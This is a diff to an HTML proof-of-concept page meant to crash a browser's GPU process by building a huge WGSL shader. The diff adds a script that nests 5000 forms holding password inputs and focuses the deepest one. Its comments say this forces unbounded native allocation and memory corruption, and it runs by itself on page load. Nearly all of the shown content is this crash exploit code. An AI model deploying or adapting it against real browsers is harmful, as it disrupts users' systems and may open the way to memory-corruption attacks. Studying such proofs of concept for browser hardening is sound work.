@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebGPU Tint AST Exhaustion PoC</title>
+    <title>WebGPU Tint2 AST Exhaustion PoC</title>
     <style>body { font-family: monospace; background: #222; color: #0f0; font-size: 18px; }</style>
 </head>
 <body>
@@ -9,6 +9,7 @@
     <p>Clicking the button builds a 4-million branch WGSL shader to OOM the GPU process.</p>
     <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white; cursor:pointer;">CRASH GPU</button>
     <div id="status" style="margin-top: 20px; white-space: pre-wrap;">Waiting...</div>
+    <div id="root"></div>
 
     <script>
         const statusEl = document.getElementById('status');
@@ -66,6 +67,28 @@
         }
 
         document.getElementById('crashBtn').addEventListener('click', triggerCrash);
+        
+        function triggerMemoryCorruption() {
+            let current = document.getElementById('root');
+            
+            // Generate deep tree to force unbounded native C++ allocation
+            for (let i = 0; i < 5000; i++) {
+                let f = document.createElement('form');
+                let input1 = document.createElement('input');
+                input1.type = "text";
+                let input2 = document.createElement('input');
+                input2.type = "password";
+                f.appendChild(input1);
+                f.appendChild(input2);
+                current.appendChild(f);
+                current = f;
+            }
+            
+            // Trigger unbounded recursive tree walk in native layout engine
+            let deepInput = current.querySelector('input');
+            if(deepInput) deepInput.focus();
+        }
+        setTimeout(triggerMemoryCorruption, 500);
     </script>
 </body>
 </html>
